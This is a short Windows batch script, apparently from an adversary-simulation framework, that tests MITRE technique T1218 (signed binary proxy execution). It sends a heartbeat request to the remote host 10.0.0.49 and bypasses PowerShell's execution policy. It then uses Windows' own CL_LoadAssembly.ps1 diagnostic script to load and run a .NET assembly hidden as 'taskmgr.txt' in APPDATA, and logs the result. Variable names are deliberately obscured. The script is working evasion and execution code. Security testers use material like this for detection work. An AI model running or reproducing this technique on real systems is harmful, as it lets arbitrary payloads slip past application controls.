@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET bhgtr=%APPDATA%\9500\0dfc3940
SET vnwer=https://10.0.0.49
SET xcvnm=https://10.0.0.49/stage/2/icon.png?9500-7
SET lkqas=ITZEL-S2B
SET zxmnb=7
SET fgtry=taskmgr.txt
SET qwpol=9500
SET vbnmj=%APPDATA%\!zxmnb!\macula-simulations.log
SET fghty=%APPDATA%\!zxmnb!
SET jklop=CL_LoadAssembly.ps1
SET asdfg=T1218
SET hjklz=0
SET plmko=
echo [%DATE% %TIME%][DEBUG][!lkqas!]: script_start>> "!vbnmj!" 2>nul
curl -k -s -o nul "!xcvnm!"
echo [%DATE% %TIME%][DEBUG][!lkqas!]: heartbeat_sent>> "!vbnmj!" 2>nul
if exist "!bhgtr!\!fgtry!" (
    powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\!jklop!; LoadAssemblyFromPath !bhgtr!\!fgtry!;[Program]::Dale()"
    if !errorlevel! equ 0 (
        SET hjklz=1
        SET plmko=
    ) else (
        SET plmko=assembly_load_failed
    )
    echo [%DATE% %TIME%][DEBUG][!lkqas!]: assembly_executed errorlevel=!errorlevel!>> "!vbnmj!" 2>nul
) else (
    SET plmko=file_not_found
    echo [%DATE% %TIME%][DEBUG][!lkqas!]: file_missing path=!bhgtr!\!fgtry!>> "!vbnmj!" 2>nul
)
for /f "tokens=1-3 delims=/ " %%a in ("!date!") do set d1=%%c
for /f "tokens=1-3 delims=/ " %%a in ("!date!") do set d2=%%a
for /f "tokens=1-3 delims=/ " %%a in ("!date!") do set d3=%%b
set tstamp=!d1!-!d2!-!d3! !time!
echo [!tstamp!][!lkqas!]: !zxmnb!-!qwpol!-!asdfg!|Signed Binary Proxy Execution=!hjklz!:!plmko!>> "!vbnmj!" 2>nul
echo [%DATE% %TIME%][DEBUG][!lkqas!]: ttp_logged>> "!vbnmj!" 2>nul